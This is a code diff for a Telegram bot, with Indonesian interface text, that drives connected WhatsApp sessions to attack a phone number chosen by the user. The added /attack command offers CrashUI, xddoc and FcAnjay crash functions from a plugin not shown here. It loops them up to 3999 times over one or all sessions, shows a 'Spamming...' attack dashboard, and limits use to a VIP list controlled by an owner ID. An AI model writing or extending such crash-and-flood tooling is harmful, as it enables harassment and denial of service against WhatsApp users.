@@ -19,10 +19,17 @@ bot.on('polling_error', (error) => {
 });
 
 
-import { CrashUI, TestPing, TestReaction } from "./plugins/testFunc.js";
+import {
+    CrashUI,
+    TestPing,
+    TestReaction,
+    FcAnjay,
+    xddoc
+} from "./plugins/plugin-function.js";
 import { match } from "assert";
 
 const vipFile = path.join(process.cwd(), 'data', 'vip_users.json');
+const activeLoops = new Map(); // chatId -> { status: boolean, target: string, type: string, count: number, mode: string, startTime: number }
 
 // Helper to read/write VIPs
 async function getVips() {
@@ -33,17 +40,24 @@ async function getVips() {
     }
 }
 
-async function addVip(number, name) {
+const OWNER_ID = 5664727948; // Replace with your actual Telegram User ID
+
+async function isVip(userId) {
     const vips = await getVips();
-    if (!vips.find(v => v.number === number)) {
-        vips.push({ number, name, addedAt: new Date().toISOString() });
+    return userId === OWNER_ID || vips.some(v => v.userId === userId);
+}
+
+async function addVip(userId, name) {
+    const vips = await getVips();
+    if (!vips.find(v => v.userId === userId)) {
+        vips.push({ userId, name, addedAt: new Date().toISOString() });
         await fsExtra.writeJson(vipFile, vips, { spaces: 2 });
     }
 }
 
-async function removeVip(number) {
+async function removeVip(userId) {
     let vips = await getVips();
-    vips = vips.filter(v => v.number !== number);
+    vips = vips.filter(v => v.userId !== userId);
     await fsExtra.writeJson(vipFile, vips, { spaces: 2 });
 }
 
@@ -167,6 +181,118 @@ Status: 🟢 Online
         })
     }
 
+    if (data.startsWith('pick_func:')) {
+        const [_, func, target] = data.split(':');
+        await bot.editMessageCaption(`🎯 *Target:* \`${target}\`\n🔥 *Function:* \`${func}\`\n\nSilakan pilih mode pengiriman:`, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: "Markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "Single Session", callback_data: `start:${func}:1:${target}` },
+                        { text: "Multi Session", callback_data: `start:${func}:2:${target}` }
+                    ],
+                    [{ text: "🔙 Cancel", callback_data: "back" }]
+                ]
+            }
+        });
+    }
+
+    if (data.startsWith('start:')) {
+        const [_, func, mode, target] = data.split(':');
+        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
+        
+        if (activeLoops.has(chatId) && activeLoops.get(chatId).status) {
+            return bot.answerCallbackQuery(query.id, { text: "⚠️ Ada serangan yang sedang berjalan!", show_alert: true });
+        }
+
+        const loopInfo = { 
+            status: true, 
+            target: target, 
+            type: func, 
+            count: 0, 
+            mode: mode === '1' ? 'Single' : 'Multi', 
+            startTime: Date.now() 
+        };
+        activeLoops.set(chatId, loopInfo);
+
+        // Dashboard Message
+        const sendDashboard = async () => {
+            const duration = Math.floor((Date.now() - loopInfo.startTime) / 1000);
+            const dashboard = `
+🚀 *XOVALIUM ATTACK DASHBOARD*
+━━━━━━━━━━━━━━━━━━━━
+🎯 *Target:* \`${target}\`
+🔥 *Function:* \`${func}\`
+📡 *Mode:* \`${loopInfo.mode} Session\`
+📊 *Sent:* \`${loopInfo.count}/3999\`
+⏱️ *Uptime:* \`${duration}s\`
+🟢 *Status:* \`Spamming...\`
+━━━━━━━━━━━━━━━━━━━━
+Gunakan /stop untuk menghentikan serangan.`;
+            
+            try {
+                await bot.editMessageCaption(dashboard, {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: "Markdown"
+                });
+            } catch (e) {
+                // If caption hasn't changed or other error, just ignore
+            }
+        };
+
+        await sendDashboard();
+        const updateInterval = setInterval(() => {
+            if (!activeLoops.has(chatId) || !activeLoops.get(chatId).status) {
+                clearInterval(updateInterval);
+                return;
+            }
+            sendDashboard();
+        }, 5000);
+
+        const runAttack = async (sock) => {
+            while (activeLoops.has(chatId) && activeLoops.get(chatId).status && loopInfo.count < 3999) {
+                try {
+                    if (func === 'crash') {
+                        await CrashUI(sock, jid);
+                        await xddoc(sock, jid);
+                    } else if (func === 'xddoc') {
+                        await xddoc(sock, jid);
+                    } else {
+                        await FcAnjay(sock, jid);
+                    }
+                    loopInfo.count++;
+                    await delay(500); // 500ms delay as requested
+                } catch (err) {
+                    console.error(`Error in attack loop:`, err.message);
+                    await delay(2000);
+                }
+            }
+            if (loopInfo.count >= 3999) {
+                activeLoops.delete(chatId);
+                bot.sendMessage(chatId, `✅ Serangan ke ${target} selesai (Limit 3999 tercapai).`);
+            }
+        };
+
+        if (mode === '2') {
+            if (sessions.size === 0) {
+                activeLoops.delete(chatId);
+                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi aktif.");
+            }
+            sessions.forEach(sock => runAttack(sock));
+        } else {
+            let sock = sessions.get('default');
+            if (!sock && sessions.size > 0) sock = sessions.values().next().value;
+            if (!sock) {
+                activeLoops.delete(chatId);
+                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi aktif.");
+            }
+            runAttack(sock);
+        }
+    }
+
     bot.answerCallbackQuery(query.id);
 });
 
@@ -237,167 +363,87 @@ bot.onText(/\/logout (.+)/, async (msg, match) => {
     }
 });
 
-bot.onText(/\/crash(?: (.+))?/, async (msg, match) => {
+bot.onText(/\/attack(?: (.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const rawArgs = match[1] ? match[1].trim().split(/\s+/) : [];
-    
-    if (rawArgs.length === 0) {
-        return bot.sendMessage(chatId, "⚠️ Usage: /crash <target> [amount] [mode]\n\nMode:\n1: Single Session (Default)\n2: Multi Session (All Active Sessions)");
+    const userId = msg.from.id;
+
+    if (!(await isVip(userId))) {
+        return bot.sendMessage(chatId, "⚠️ Maaf, perintah ini hanya untuk user VIP.");
     }
 
-    const target = rawArgs[0];
-    let amount = 1;
-    let mode = 1;
-
-    // Parse args: target amount mode
-    if (rawArgs.length > 1) {
-        if (/^\d+$/.test(rawArgs[1])) amount = parseInt(rawArgs[1]);
-        if (rawArgs.length > 2 && /^\d+$/.test(rawArgs[2])) mode = parseInt(rawArgs[2]);
+    const target = match[1]?.trim();
+    if (!target) {
+        return bot.sendMessage(chatId, "⚠️ Usage: /attack <target_number>");
     }
 
-    if (amount > 4999) {
-        return bot.sendMessage(chatId, "⚠️ Demi keamanan, batas maksimal spam adalah 4999 pesan.");
-    }
-
-    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
-
-    if (mode === 2) {
-        // Multi-Session Mode
-        if (sessions.size === 0) {
-            return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif untuk Multi-Session.");
+    await bot.sendVideo(chatId, "https://files.catbox.moe/bf2a8i.mp4", {
+        caption: `🚀 *XOVALIUM ATTACK SYSTEM*\n━━━━━━━━━━━━━━━━━━━━\n🎯 *Target:* \`${target}\`\n\nSilakan pilih function yang ingin digunakan:`,
+        parse_mode: "Markdown",
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "CrashUI + xddoc", callback_data: `pick_func:crash:${target}` },
+                    { text: "xddoc Only", callback_data: `pick_func:xddoc:${target}` }
+                ],
+                [
+                    { text: "FcAnjay (Testing)", callback_data: `pick_func:fc_anjay:${target}` }
+                ],
+                [{ text: "❌ Cancel", callback_data: "back" }]
+            ]
         }
-        
-        bot.sendMessage(chatId, `🚀 Memulai serangan Multi-Session ke ${target} menggunakan ${sessions.size} sesi aktif...`);
-        
-        let successCount = 0;
-        sessions.forEach((sock, name) => {
-            // Run async without awaiting loop completion to avoid blocking bot
-            (async () => {
-                try {
-                    for (let i = 0; i < amount; i++) {
-                        await TestPing(sock, jid);
-                        if (i < amount - 1) await delay(1500); 
-                    }
-                    successCount++;
-                } catch (err) {
-                    console.error(`Error in session ${name}:`, err.message);
-                }
-            })();
-        });
+    });
+});
 
-        bot.sendMessage(chatId, `✅ Perintah serangan dikirim ke seluruh sesi (${sessions.size} sesi).`);
+// Admin Commands
+bot.onText(/\/addvip(?: (.+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
 
+    if (userId !== OWNER_ID) {
+        return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menambah VIP.");
+    }
+
+    const args = match[1] ? match[1].split(' ') : [];
+    if (args.length < 2) {
+        return bot.sendMessage(chatId, "⚠️ Format: `/addvip <userId> <name>`", { parse_mode: 'Markdown' });
+    }
+
+    const targetId = parseInt(args[0]);
+    const name = args.slice(1).join(' ');
+
+    await addVip(targetId, name);
+    bot.sendMessage(chatId, `✅ Berhasil menambahkan *${name}* (${targetId}) ke daftar VIP.`, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/delvip(?: (.+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (userId !== OWNER_ID) {
+        return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menghapus VIP.");
+    }
+
+    const targetId = parseInt(match[1]);
+    if (!targetId) {
+        return bot.sendMessage(chatId, "⚠️ Format: `/delvip <userId>`", { parse_mode: 'Markdown' });
+    }
+
+    await removeVip(targetId);
+    bot.sendMessage(chatId, `✅ Berhasil menghapus ID *${targetId}* dari daftar VIP.`, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/id/, (msg) => {
+    bot.sendMessage(msg.chat.id, `ID Kamu: \`${msg.from.id}\`\nChat ID: \`${msg.chat.id}\``, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/stop/, (msg) => {
+    const chatId = msg.chat.id;
+    if (activeLoops.has(chatId)) {
+        activeLoops.get(chatId).status = false;
+        activeLoops.delete(chatId);
+        bot.sendMessage(chatId, "✅ Serangan dihentikan.");
     } else {
-        // Single Session Mode (Auto-select)
-        let sock = sessions.get('default');
-        let sessionName = 'default';
-
-        // Fallback if 'default' doesn't exist, pick the first available
-        if (!sock) {
-            if (sessions.size > 0) {
-                const firstEntry = sessions.entries().next().value;
-                sessionName = firstEntry[0];
-                sock = firstEntry[1];
-            } else {
-                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif.");
-            }
-        }
-
-        bot.sendMessage(chatId, `🚀 Mengirim ${amount} crash messages ke ${target} via sesi '${sessionName}'...`);
-
-        let i = 0;
-        try {
-            for (i = 0; i < amount; i++) {
-                await TestPing(sock, jid);
-                if (i < amount - 1) await delay(1500); 
-            }
-            bot.sendMessage(chatId, `✅ Berhasil mengirim ${amount} crash messages ke ${target}!`);
-        } catch (err) {
-            console.error(err);
-            bot.sendMessage(chatId, `❌ Gagal saat mengirim crash (sent: ${i}/${amount}): ${err.message}`);
-        }
+        bot.sendMessage(chatId, "❌ Tidak ada serangan yang aktif untuk chat ini.");
     }
 });
 
-
-bot.onText(/\/testing(?: (.+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const rawArgs = match[1] ? match[1].trim().split(/\s+/) : [];
-
-    if (rawArgs.length === 0) {
-        return bot.sendMessage(chatId, "Usage: /testing <target> [amount] [mode]\n\nMode:\n1: Single Session (Default)\n2: Multi Session (All Active Sessions)");
-    }
-    
-    const target = rawArgs[0];
-    let amount = 1;
-    let mode = 1;
-
-    // Parse args: target amount mode
-    if (rawArgs.length > 1) {
-        if (/^\d+$/.test(rawArgs[1])) amount = parseInt(rawArgs[1]);
-        if (rawArgs.length > 2 && /^\d+$/.test(rawArgs[2])) mode = parseInt(rawArgs[2]);
-    }
-
-    if (amount > 4999) {
-        return bot.sendMessage(chatId, "⚠️ Demi keamanan, batas maksimal spam adalah 4999 pesan.");
-    }
-
-    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
-
-    if (mode === 2) {
-        // Multi-Session Mode
-        if (sessions.size === 0) {
-            return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif untuk Multi-Session.");
-        }
-        
-        bot.sendMessage(chatId, `🚀 Memulai serangan Testing (Reaction) Multi-Session ke ${target} menggunakan ${sessions.size} sesi aktif...`);
-        
-        let successCount = 0;
-        sessions.forEach((sock, name) => {
-            // Run async without awaiting loop completion to avoid blocking bot
-            (async () => {
-                try {
-                    for (let i = 0; i < amount; i++) {
-                        await TestReaction(sock, jid);
-                        if (i < amount - 1) await delay(1500); 
-                    }
-                    successCount++;
-                } catch (err) {
-                    console.error(`Error in session ${name}:`, err.message);
-                }
-            })();
-        });
-
-        bot.sendMessage(chatId, `✅ Perintah Testing dikirim ke seluruh sesi (${sessions.size} sesi).`);
-
-    } else {
-        // Single Session Mode (Auto-select)
-        let sock = sessions.get('default');
-        let sessionName = 'default';
-
-        // Fallback if 'default' doesn't exist, pick the first available
-        if (!sock) {
-            if (sessions.size > 0) {
-                const firstEntry = sessions.entries().next().value;
-                sessionName = firstEntry[0];
-                sock = firstEntry[1];
-            } else {
-                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif.");
-            }
-        }
-
-        bot.sendMessage(chatId, `🚀 Mengirim ${amount} testing (reaction) ke ${target} via sesi '${sessionName}'...`);
-
-        let i = 0;
-        try {
-            for (i = 0; i < amount; i++) {
-                await TestReaction(sock, jid);
-                if (i < amount - 1) await delay(1500);
-            }
-            bot.sendMessage(chatId, `✅ Succesfully sending ${amount} testing function to ${target} via ${sessionName}`);
-        } catch (err) {
-            console.error(err);
-            bot.sendMessage(chatId, `❌ Failed to send testing function to ${target} via ${sessionName}`);
-        }
-    }
-});
